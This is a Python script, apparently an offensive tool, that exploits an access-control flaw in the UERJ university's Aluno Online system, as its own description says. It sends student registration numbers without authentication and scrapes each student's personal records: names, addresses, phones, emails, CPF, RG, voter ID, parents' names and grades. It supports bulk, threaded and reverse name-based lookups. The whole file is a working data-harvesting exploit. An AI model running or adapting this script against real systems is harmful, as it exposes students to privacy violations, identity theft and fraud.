#!/usr/bin/python3

from urllib.parse import urlencode
from urllib.request import urlopen, Request
from bs4 import BeautifulSoup
from argparse import ArgumentParser
from threading import Thread
import re

class HackAlunoOnline:

	def __init__( self , matricula , full_search = False ):
		# Exibicao default de matricula/nome/curso/situacao/periodo/CRA
		# full search para as demais informacoes

		# Main url
		self.aluno_online_url = 'https://www.alunoonline.uerj.br'
		
		# parameters
		self.matricula        = matricula
		self.full_search      = full_search

		# Main html
		self.main_html        = self._get_aluno_online_html( '/requisicaoaluno/requisicao.php' , { 'requisicao': 'SinteseFormacao' } )
		
		# Main data
		self.nome             = self._extract_nome()
		self.cra              = self._extract_cra()
		self.curso            = self._extract_curso()
		self.situacao         = self._extract_situacao()
		self.periodo          = self._extract_periodo()

		# get and extract personal data
		if ( self.full_search ):
			# dados contato
			self.dados_contato_html          = self._get_aluno_online_html( '/recadastramento_dados_contato/recadastramento_dados_contato.php' )
			self.telefone                    = self._extract_telefone()
			self.email                       = self._extract_email()
			self.endereco                    = self._extract_endereco()
			self.cep                         = self._extract_cep()

			# dados pessoais
			self.dados_pessoais_html         = self._get_aluno_online_html( '/recadastramento_dados_pessoais/recadastramento_dados_pessoais.php' )
			self.nascimento                  = self._extract_nascimento()
			self.sexo                        = self._extract_sexo()
			self.estado_civil                = self._extract_estado_civil()
			self.naturalidade                = self._extract_naturalidade()
			self.nacionalidade               = self._extract_nacionalidade()
			self.pai                         = self._extract_pai()
			self.mae                         = self._extract_mae()
			self.cpf                         = self._extract_cpf()
			self.rg                          = self._extract_rg()                     #Número, Órgão, UF, País, Data Emissão, Data Validade
			self.titulo_eleitor              = self._extract_titulo_eleitor()         #Número, Zona, Seção, UF, Data Emissão
			self.certificado_reservista      = self._extract_certificado_reservista() #Número, Nro. de Série, Órgão, Tipo, Data Emissão, UF
			self.ensino_medio                = self._extract_ensino_medio()           #Nome do Estabelecimento, País, UF, Tipo de Ensino, Data Conclusão
			
			# disciplinas
			self.disciplinas_realizadas_html = self._get_aluno_online_html( '/requisicaoaluno/requisicao.php' , { 'requisicao': 'DisciplinasRealizadas' } )
			self.disciplinas                 = self._extract_disciplinas()

	def _get_aluno_online_html( self , endpoint , parameters = {} ):
		result = None
		
		try:
			parameters.update( { 'matricula': self.matricula } )
			data     = urlencode( parameters )
			request  = Request( self.aluno_online_url + endpoint , data.encode( 'ascii' ) )
			response = urlopen( request )
			result   = BeautifulSoup( response.read() , 'html.parser' )
		except:
			pass
		
		return result

	def _extract_nome( self ):
		try:
			nome = self.main_html.find( id = "table_cabecalho_rodape" ).find_all( 'font' )[2].string[15:]
		except:
			nome = ''

		return nome

	def _extract_cra( self ):
		try:
			cra = float( self.main_html.find_all( 'div' )[7].text[16:].replace( ',' , '.' ) )
		except:
			cra = ''

		return cra

	def _extract_curso( self ):
		try:
			curso = self.main_html.find_all( 'div' )[6].text[8:]
		except:
			curso = ''

		return curso
	
	def _extract_situacao( self ):
		try:
			situacao = self.main_html.find_all( 'div' )[4].text[11:]
		except:
			situacao = ''

		return situacao

	def _extract_periodo( self ):
		try:
			for element in self.main_html.select( 'div > b' ):
				if ( element.text == "Períodos Utilizados/Em Uso para Integralização Curricular:" ):
					periodo = int( element.parent.text[59:] )
		except:
			periodo = ''

		return periodo

	def _format_telefone( self , ddd , tel , ramal ):
		return '({0}) {1} [{2}]'.format( ddd , tel[:4] + '-' + tel[4:] , ( 'Sem Ramal' if not ramal else ( 'Ramal ' + ramal ) ) )
	
	def _extract_telefone( self ):
		telefone = []
		# Tel 1..2
		for i in range( 1 , 3 ):
			try:
				ddd   = self.dados_contato_html.find( 'input' , { 'name': 'num_ddd_' + str( i ) + '_pag' } ).get( 'value' )
				tel   = self.dados_contato_html.find( 'input' , { 'name': 'num_tel_' + str( i ) + '_pag' } ).get( 'value' )
				ramal = self.dados_contato_html.find( 'input' , { 'name': 'num_ramal_' + str( i ) + '_pag' } ).get( 'value' )
				telefone.append( self._format_telefone( ddd , tel , ramal ) )
			except:
				pass
		
		return telefone

	def _extract_email( self ):
		try:
			email = self.dados_contato_html.find( 'input' , { 'name': 'dsc_email_pag' } ).get( 'value' )
		except:
			email = ''

		return email
	
	def _extract_endereco( self ):
		try:
			endereco = self.dados_contato_html.find( 'input' , { 'name': 'txt_end_pag' } ).get( 'value' )
			endereco += ', ' + self.dados_contato_html.find( 'input' , { 'name': 'cod_bairro_input' } ).get( 'value' )
			endereco += ', ' + self.dados_contato_html.select( 'select[name="cod_munic_pag"] option[selected]' )[0].text
			endereco += ', ' + self.dados_contato_html.select( 'select[name="cod_uf_pag"] option[selected]' )[0].text
		except:
			endereco = ''

		return endereco

	def _extract_cep( self ):
		try:
			cep = self.dados_contato_html.find( 'input' , { 'name': 'num_cep_pag' } ).get( 'value' )
			cep = cep[:5] + '-' + cep[5:]
		except:
			cep = ''

		return cep

	def _extract_nascimento( self ):
		try:
			nascimento = self.dados_pessoais_html.find_all( 'div' )[2].text[15:]
		except:
			nascimento = ''

		return nascimento

	def _extract_sexo( self ):
		try:
			sexo = self.dados_pessoais_html.find_all( 'div' )[3].text[6:]
		except:
			sexo = ''

		return sexo

	def _extract_estado_civil( self ):
		try:
			civil = self.dados_pessoais_html.find_all( 'div' )[4].text[12:]
		except:
			civil = ''

		return civil

	def _extract_naturalidade( self ):
		try:
			naturalidade = self.dados_pessoais_html.find_all( 'div' )[5].text[14:]
		except:
			naturalidade = ''

		return naturalidade

	def _extract_nacionalidade( self ):
		try:
			nacionalidade = self.dados_pessoais_html.find_all( 'div' )[6].text[15:]
		except:
			nacionalidade = ''

		return nacionalidade

	def _extract_pai( self ):
		try:
			pai = self.dados_pessoais_html.find_all( 'div' )[7].text[13:]
		except:
			pai = ''

		return pai

	def _extract_mae( self ):
		try:
			mae = self.dados_pessoais_html.find_all( 'div' )[8].text[13:]
		except:
			mae = ''

		return mae

	def _extract_cpf( self ):
		try:
			cpf = self.dados_pessoais_html.find_all( 'font' )[10].text
			cpf = cpf[:3] + '.' + cpf[3:6] + '.' + cpf[6:9] + '-' + cpf[9:]
		except:
			cpf = ''

		return cpf

	def _extract_dados_pessoais_divs( self , start , end , cut ):
		arrayReturn = []
		try:
			array = self.dados_pessoais_html.find_all( 'div' )[start:end]
			arrayReturn.append( array[0].text[cut:] )
			for data in array[1:]:
				text = data.text.strip()
				if ( ( not 'Não Informado' in text ) and ( not '__/__/____' in text ) ):
					arrayReturn.append( text )
		except:
			arrayReturn = ''

		return arrayReturn

	def _extract_rg( self ):
		return self._extract_dados_pessoais_divs( 9 , 14 , 8 )

	def _extract_titulo_eleitor( self ):
		return self._extract_dados_pessoais_divs( 15 , 19 , 8 )

	def _extract_certificado_reservista( self ):
		return self._extract_dados_pessoais_divs( 20 , 25 , 8 )

	def _extract_ensino_medio( self ):
		return self._extract_dados_pessoais_divs( 26 , 31 , 25 )

	def _extract_disciplinas( self ):
		disciplinas = []
		try:

			for linha in self.disciplinas_realizadas_html.find_all( 'div' , style = re.compile( '^width:100%;font-size=12px;' ) ):
				conteudoLinha = []
				for coluna in linha.children:
					conteudoColuna = coluna.string.strip()
					if ( conteudoColuna and not re.match( '\\d{4}/\\d' , conteudoColuna ) ):
						conteudoLinha.append( conteudoColuna )
				disciplinas.append( ( '{0:60} {1:2} {2:3} {3:15} {4:10}' + ( ' {5:6} {6:15}' if ( len( conteudoLinha ) > 5 ) else '' ) ).format( *conteudoLinha ) )
		except:
			disciplinas = ''

		return disciplinas

	def _truncate( self , string , width ):
		if ( len( string ) > width ):
			string = string[:( width - 3 )] + '...'

		return string

	def __str__( self ):
		if self.full_search:
			pattern    = "\n{0:12} - {1:50}\n\nMatricula: {0}\nNome: {1}\nCurso: {2}\nSituacao: {3}\nPeriodo: {4}\nCRA: {5}\n"
			pattern   += "\n-Contato-\n\nTelefone: {6}\nE-mail: {7}\nEndereço: {8}\nCEP: {9}\n"
			pattern   += "\n-Informações Pessoais-\n\nData de Nascimento: {10}\nSexo: {11}\nEstado Civil: {12}\nNaturalidade: {13}\nNacionalidade: {14}\nNome do Pai: {15}\nNome da Mãe: {16}\nCPF: {17}\nRG: {18}\nTítulo de Eleitor: {19}\nCertificado de Reservista: {20}\nEnsino Médio: {21}\n"
			pattern   += "\n-Disciplinas Realizadas-\n\n{22}\n\n"
			parameters = [ self.matricula , self.nome , self.curso , self.situacao , self.periodo , self.cra , ', '.join( self.telefone ) , self.email , self.endereco , self.cep , self.nascimento , self.sexo , self.estado_civil , self.naturalidade , self.nacionalidade , self.pai , self.mae , self.cpf , ', '.join( self.rg ) , ', '.join( self.titulo_eleitor ) , ', '.join( self.certificado_reservista ) , ', '.join( self.ensino_medio ) , '\n'.join( self.disciplinas ) ]
		else:
			pattern    = "{0:12}\t{1:30}\t{2:20}\t{3:10}\t{4:3}\t{5:4}"
			parameters = [ self.matricula , self._truncate( self.nome , 30 ) ,  self._truncate( self.curso , 20 ) , self._truncate( self.situacao , 10 ) , self.periodo , self.cra ]
		
		return pattern.format( *parameters )

# End class

def get_registry_by_name( name , searchfile ):
	matriculas = []
	
	with open( searchfile , 'r' ) as arquivo:
		for line in arquivo.readlines():
			matricula, nomeArquivo = line.split( ':' )
			if name in nomeArquivo.lower():
				matriculas.append( matricula )
	
	return matriculas

def get_data( matricula , full_search ):
	hao = HackAlunoOnline( matricula , full_search )
	print( hao )

# Programa para recuperar os dados de um aluno da UERJ atraves de sua matricula

def Main():
	parser = ArgumentParser( description = "Recupera informacoes de alunos da UERJ atraves de falhas do sistema academico Aluno Online" )
	
	parser.add_argument( 'matricula' , help = "Matricula do aluno" )

	parser.add_argument( '-i' , '--inputfile'  , help = "Utilizar um arquivo contendo uma lista de matriculas com uma matricula por linha como entrada" , action = "store_true" )
	parser.add_argument( '-r' , '--reverse'    , help = "Procura reversa -> busca matricula por nome (para alunos do IPRJ)" , action = "store_true" )
	parser.add_argument( '-f' , '--fullsearch' , help = "Busca completa por informações pessoais" , action = "store_true" )
	parser.add_argument( '-s' , '--searchfile' , help = "Nome do arquivo contendo matricula:nome que deverá ser usado na busca reversa" , default = "matricula-nome.txt" )

	args = parser.parse_args()

	matriculas = []

	if ( args.reverse and args.inputfile ):
		with open( args.matricula , 'r' ) as arquivoNomes:
			for nome in arquivoNomes:
				matriculas.extend( get_registry_by_name( nome.strip( '\n' ) , args.searchfile ) )
	elif args.reverse:
		matriculas = get_registry_by_name( args.matricula.lower() , args.searchfile )
	elif args.inputfile:
		file = open( args.matricula , 'r' )
		matriculas = file.readlines()
	else:
		matriculas.append( args.matricula )

	if ( not matriculas ):
		print( "Nao foram encontrados dados para esta matricula" )
	else:
		if ( not args.fullsearch ):
			print( "{0:12}\t{1:30}\t{2:20}\t{3:10}\t{4:2}\t{5:4}".format( "Matricula", "Nome", "Curso" , "Situacao" , "Periodo" , "CRA" ) )

		for matricula in matriculas:
			thread = Thread( target = get_data , args = ( matricula.strip( '\n' ) , args.fullsearch ) )
			thread.start()

# End Main

if __name__ == '__main__':
	Main()